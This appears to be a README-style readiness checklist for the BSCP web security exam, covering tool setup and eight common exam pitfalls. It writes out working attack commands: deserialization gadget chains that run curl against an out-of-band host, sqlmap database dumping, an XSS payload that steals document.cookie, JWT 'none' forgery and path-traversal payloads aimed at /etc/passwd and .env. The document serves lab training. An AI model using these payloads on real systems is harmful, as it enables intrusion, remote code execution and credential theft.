# BSCP exam VM readiness checklist

If your VM is missing any of these, you'll lose time on the exam mid-attack. Run the setup script once, then use this doc as a "when do I reach for what" reference.

## Quick install

```bash
bash bscp-setup.sh           # installs ysoserial, PHPGGC, sqlmap to /opt
bash bscp-setup.sh --check   # verify-only mode (no installs)
```

The script also reports whether `cloudflared`, `ssh`, `java`, `php`, `python3`, `git`, `curl` are present.

---

## Command-line tools you MUST have on PATH

| Tool | What for | Where it lives after setup |
|---|---|---|
| `ysoserial` | Java deserialization → RCE gadget generation (Stage 3) | `/opt/ysoserial/ysoserial.jar` + wrapper at `/usr/local/bin/ysoserial` |
| `phpggc`    | PHP deserialization → RCE gadget generation | `/opt/phpggc/` + wrapper at `/usr/local/bin/phpggc` |
| `sqlmap`    | Automated SQL injection — most complete + reliable scanner | `/opt/sqlmap/` + wrapper at `/usr/local/bin/sqlmap` |
| `python3`   | Local HTTP server + this repo's tools | usually pre-installed |
| `ssh`       | Free SSH-based tunneling fallback | usually pre-installed |
| `cloudflared` | **Recommended** free local-server tunneling (best ngrok alternative — no signup, no 2-hour limit) | install per https://pkg.cloudflare.com/index.html |
| `java`      | Required by `ysoserial` | `apt install default-jre-headless` |
| `php`       | Required by `phpggc` | `apt install php-cli` |

---

## Tool reference card

### ysoserial — Java deserialization

When the target accepts a Java-serialized blob (often via cookies, hidden form fields, or RMI ports) and you can control its contents, generate a gadget chain that triggers RCE on deserialization.

```bash
# List every chain ysoserial knows about
ysoserial

# Generate a CommonsCollections6 gadget that runs `curl https://your-collab/x`.
# Pipe to base64 if the target expects base64-encoded serialized data.
ysoserial CommonsCollections6 'curl https://abc.interactsh-server/x' | base64 -w0

# Other common chains worth trying when CC6 doesn't work:
#   CommonsCollections1   older apps still pinning Commons-Collections 3.1
#   CommonsBeanutils1     when CB is on the classpath but CC isn't
#   Hibernate1            ORM stack
#   Spring1               Spring framework
#   URLDNS                no RCE; just causes a DNS lookup (perfect first probe)
```

**Test for vulnerability FIRST with URLDNS** — generates a payload that triggers a DNS lookup. Pair with `--oob-host` from `intruder.py` to confirm the deserialization sink before chaining for RCE:

```bash
ysoserial URLDNS https://abc.interactsh-server | base64 -w0
# Submit it. If you see a DNS hit on abc.interactsh-server, deserialization is real.
```

### PHPGGC — PHP deserialization

Same idea but for PHP `unserialize()` sinks.

```bash
# List all chains
phpggc -l

# Generate a Laravel/RCE chain that runs a system command
phpggc Laravel/RCE5 system 'id' -b   # -b = base64-encoded output

# Generate a Symfony chain
phpggc Symfony/RCE4 system 'curl https://abc.interactsh-server/x' -b
```

PHP context is usually surfaced via Laravel session cookies, WordPress meta values, or directly via a `?data=` parameter that gets `unserialize()`'d.

### sqlmap — SQL injection automation

Save your candidate request from Burp's Proxy History (right-click → Save Item → save as `req.txt`), then point sqlmap at it.

```bash
# Most common: just feed it the request file. --batch = no prompts.
sqlmap -r req.txt --batch

# Specify the parameter you suspect (faster than letting sqlmap test all)
sqlmap -r req.txt --batch -p username

# Once it finds an injection, escalate to dumping data:
sqlmap -r req.txt --batch --dbs                    # list databases
sqlmap -r req.txt --batch -D <dbname> --tables     # list tables
sqlmap -r req.txt --batch -D <db> -T <tbl> --dump  # dump table

# Common useful flags:
#   --level=5 --risk=3        more aggressive tests (try when basic finds nothing)
#   --technique=BEUSTQ         restrict techniques (B=boolean-blind, T=time-based, ...)
#   --tamper=between          encode payload to bypass WAFs
#   --random-agent            rotate User-Agent (defeats some basic WAFs)
#   --proxy http://127.0.0.1:8080   route through Burp to see what it's doing
```

Sqlmap WILL be slow on time-based blind injections (intentionally — bcrypt-time scale per probe). Park it in a tmux pane while you hunt other vectors elsewhere.

### Local HTTP server + tunneling — for client-side exploits

When you need to deliver an XSS / CSRF / file-exfil payload to a VICTIM browser (the lab's simulated user), the victim can't reach your `127.0.0.1`. You need a public URL.

This repo ships [`exploit_server.py`](../exploit_server.py) that combines local serving + auto-tunneling:

```bash
# Just serve files (no tunnel — LAN testing only)
python3 exploit_server.py serve ./payloads --port 8000

# Serve + Cloudflare tunnel (recommended; needs `cloudflared` installed)
python3 exploit_server.py serve ./payloads --tunnel cloudflared

# Serve + serveo SSH tunnel (zero install, needs `ssh`)
python3 exploit_server.py serve ./payloads --tunnel serveo

# Serve + localhost.run SSH tunnel (alternative)
python3 exploit_server.py serve ./payloads --tunnel localhost.run
```

You get back a public URL like `https://random-words-abc123.trycloudflare.com`. Inject that into the victim's path (XSS reflection, CSRF form action, etc.).

Each incoming request is logged live with the full path including query string — so a payload like:

```html
<script>fetch("/log?c="+document.cookie)</script>
```

shows up in your terminal as:

```
[200]  14:23:01  192.0.2.1  GET /log?c=session=admin_abc123
```

…and there's your stolen cookie.

### Why not ngrok?

ngrok's free tier now requires signup + auth-token configuration, and tunnels die after 2 hours. The alternatives above have neither limitation. If you already have ngrok set up, it works fine too — `cloudflared` is just less friction on a fresh VM.

---

## Eight exam pitfalls that get most people stuck

These mirror what experienced BSCP takers warn about. Each maps to a specific tool in this repo.

### 1. App-to-App bridge (the "two-app twist")

> *You're given two seemingly-isolated lab URLs. The exploit path requires using App A's vulnerability (often Blind SSRF) to attack App B's internal endpoints.*

If you treat them as separate puzzles you get permanently stuck on Stage 3. The right move:

1. Find a Blind SSRF entry in App A (`/admin/import-stock?stockApi=...` style is common).
2. **Confirm the SSRF is real** with `intruder.py --oob-host` or a hand-crafted probe to your OAST host. A hit on your collaborator proves App A's backend made the request.
3. Pivot the SSRF target to App B's URL or an internal address.

See [`examples/workflow-cross-app-ssrf.json`](../examples/workflow-cross-app-ssrf.json) for the full chain: log in → OAST confirm → pivot to App B → loop a small internal-IP sweep. Edit `app_a`, `app_b`, and `oob_host` at the top.

### 2. Ghost parameters (Mass Assignment / Parameter Pollution)

> *Pages that look "locked down" often accept hidden backend parameters the frontend never sends. If you're stuck on an endpoint for >10 min, fuzz it.*

This is exactly what `param_miner.py` does. The bundled `hidden-params.txt` now includes 130+ candidates across categories:

| Category | Examples |
|---|---|
| Role/privilege escalation | `admin`, `isAdmin`, `role`, `is_admin`, `sudo`, `god_mode` |
| Output-format forcers | `json`, `xml`, `format`, `output`, `fmt` |
| Prototype pollution (JS backends) | `__proto__`, `constructor`, `prototype` |
| HTTP method overrides | `_method`, `X-HTTP-Method-Override` |
| CSRF/verification bypass | `_csrf`, `skip_csrf`, `disable_auth`, `skip_auth` |
| SSRF / open-redirect entry | `next`, `redirect`, `url`, `target`, `dest`, `goto`, `callback` |
| Template/file inclusion | `template`, `include`, `import`, `file` |
| Multi-step bypass | `dry_run`, `confirm`, `skip_validation` |
| Mass-assignment IDs | `user_id`, `owner_id`, `created_by` |

```bash
python3 param_miner.py req.txt --params hidden-params.txt --cookie-jar admin.json
```

Any response whose status or length diverges from baseline is a candidate — *finding even one ghost parameter can bypass an entire auth wall*.

### 3. JWT `none` — try every variant

> *Everyone tries `"alg":"none"`. The server filters that one specifically. Try casing variants AND signature-stripping variants — don't give up after one rejection.*

`jwt_tool.py none` now emits all seven variants automatically:

```bash
python3 jwt_tool.py none '<TOKEN>' --set role=admin --set sub=admin
```

```
[*] alg-value casings (most servers filter only "none"):
  [+] alg='none' :  eyJ...eyJ.
  [+] alg='None' :  eyJ...eyJ.
  [+] alg='NONE' :  eyJ...eyJ.
  [+] alg='nOnE' :  eyJ...eyJ.
  [+] alg='NoNe' :  eyJ...eyJ.

[*] alg key REMOVED (default-to-none parsers):
  [+] (alg key absent):  eyJ...eyJ.

[*] signature segment STRIPPED (no trailing dot):
  [+] (stripped, alg=none):  eyJ...eyJ
  [+] (stripped, alg removed):  eyJ...eyJ
```

Submit each, in order, in Repeater. The five casings beat anything case-insensitive; the alg-key-removed handles parsers that default-to-none; the stripped variants handle non-standard parsers that split on `.` and never validate `parts[2]` exists.

### 4. Single-use CSRF tokens in a loop

> *Most CSRF tokens are consumed on submit. Looping a fuzz step that uses `{{csrf}}` succeeds on iteration 1 and fails on every subsequent one — the token was already burnt.*

`workflow.py` now supports a `refresh` block on loop steps that re-fetches per-request state before EACH iteration:

```json
{
  "loop": {"count": 50, "var": "i"},
  "refresh": [{
    "name": "_get_fresh_csrf",
    "request": {"method": "GET", "url": "{{base_url}}/form"},
    "extract": {"csrf": {"regex": "name=\"csrf\" value=\"([^\"]+)\""}}
  }],
  "request": {"body": "csrf={{csrf}}&...{{i}}..."}
}
```

See [`examples/workflow-csrf-refresh-loop.json`](../examples/workflow-csrf-refresh-loop.json) for the full pattern.

### 5. Cache-key "fat parameter" illusion

> *Web caches typically key only on URL + a few specific headers. Headers like `X-Forwarded-Host` AFFECT the response but aren't part of the cache key. Send the modification once, the cache serves your version to subsequent (vanilla) visitors → web cache poisoning.*

Use [`unkeyed-headers.txt`](../unkeyed-headers.txt) (40+ candidates including `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, RFC 7239 variants, CDN-specific headers) against the cache-poison template:

```bash
# 1. First, get the baseline length of a clean request:
curl -sI https://target.com | wc -c       # use response Content-Length instead if accurate
# 2. Edit examples/cache-poison-template.txt to point at your target
# 3. Fuzz one header at a time, flag anything that diverges from baseline:
python3 intruder.py examples/cache-poison-template.txt \
    --payload unkeyed-headers.txt \
    --mode sniper \
    --match-length '!<baseline>' \
    --max-rps 10
# 4. Anything that hit: send the same modified request, then a vanilla
#    request - if the cache still returns the modified version, you've
#    poisoned it.
```

### 6. Server-side framework normalization (path-traversal blind spot)

> *Different layers normalize URL paths differently. `..%2f..%2fadmin` may be rejected by the WAF but decoded to `../../admin` by the backend. `....//` may collapse through naive `..` strippers.*

[`path-traversal-payloads.txt`](../path-traversal-payloads.txt) contains 80+ encoding variants in categories:
- Plain `../`, `../../`, ...
- URL-encoded slash (`..%2f`)
- URL-encoded dots (`%2e%2e/`)
- Double URL-encoded (`..%252f` — filter decodes once, app decodes again)
- Backslash variants (`..\\`, `..%5c`)
- Mixed normalizers (`....//`, `....\/`)
- Null-byte truncation (`../%00`)
- UTF-8 overlong (`..%c0%af` — Apache + some Java)
- Ready-to-use full payloads (`../../../etc/passwd`, `WEB-INF/web.xml`, `.env`, `.git/config`)

```bash
python3 intruder.py req.txt --payload path-traversal-payloads.txt \
    --match-status 200 --detect-reflection
```

### 7. Session pinning logout trap

> *Some servers don't issue a new session cookie when you "log out" — the cookie persists, and logging in as User B can quietly re-use User A's session ID. Your "User B" test is actually User A's revived session.*

`workflow.py` now supports `clear_cookies: true` on a step — wipes `session.cookies` before the request goes out. A step with ONLY `clear_cookies` (no `request`) is an explicit identity-switch boundary:

```json
{"name": "switch_identity", "clear_cookies": true}
```

See [`examples/workflow-identity-switch.json`](../examples/workflow-identity-switch.json) for the canonical login-A → clear → login-B chain.

### 8. The "don't get stuck" rule (built into the launcher)

> *BSCP rule #1: if you've been on one approach for 10+ minutes without progress, you're wasting exam time. Switch angles — different tool, different payload class, different vulnerability hypothesis.*

`lab_tools.py` now enforces this:

- Tracks **cumulative time per tool** in the current launcher session.
- Shows a running tally between selections so you SEE where the time is going.
- Pre-flight **warning panel** if you pick a tool that's already consumed more than `--time-limit MINUTES` (default 15) total this session.

```bash
python3 lab_tools.py --time-limit 10
# After 10 cumulative minutes on `intruder`, picking it again triggers:
#   ⚠  stuck-time warning
#   You've spent 12 min on this tool already.
#   BSCP rule #1: don't get stuck. Consider attacking the same
#   vulnerability from a different angle - maybe a different tool,
#   different payload class, or check whether you've misidentified
#   the bug class entirely.
```

Between selections you also see:

```
Session time tracker  (warn after 15 min/tool)
┌────────────┬──────┬──────────┬───────────────────────────────┐
│ Tool       │ Runs │ Time     │ Status                        │
├────────────┼──────┼──────────┼───────────────────────────────┤
│ intruder   │    4 │ 18.3 min │ stuck — try another angle    │
│ workflow   │    2 │  5.1 min │ ok                            │
│ cyberchef  │    7 │  3.0 min │ ok                            │
└────────────┴──────┴──────────┴───────────────────────────────┘
  Total session time: 26.4 min
```

---

## Stage-by-stage usage map (BSCP)

| Stage | Likely tools needed |
|---|---|
| **Stage 1** — Initial access (auth bypass / SQLi / SSRF) | `intruder.py`, `param_miner.py`, `sqlmap`, `jwt_tool.py`, `cyberchef.py identify` |
| **Stage 2** — Privilege escalation (IDOR / broken access control) | `privesc.py`, `workflow.py` for multi-step exploits |
| **Stage 3** — High-privilege RCE (deserialization / SSTI / file upload) | `ysoserial`, `phpggc`, `exploit_server.py` for delivery, `oast_poll.py` to confirm OOB |

---

## Verifying everything works (one-line checks)

```bash
ysoserial --help 2>&1 | head -5      # should list chains
phpggc -l 2>&1 | head -5              # should list chains
sqlmap --version                       # should print sqlmap version
cloudflared --version                  # should print cloudflared version
java -version                          # should print JRE version
php --version                          # should print PHP version
```

If any of those fail, `bash bscp-setup.sh --check` will tell you what's missing.
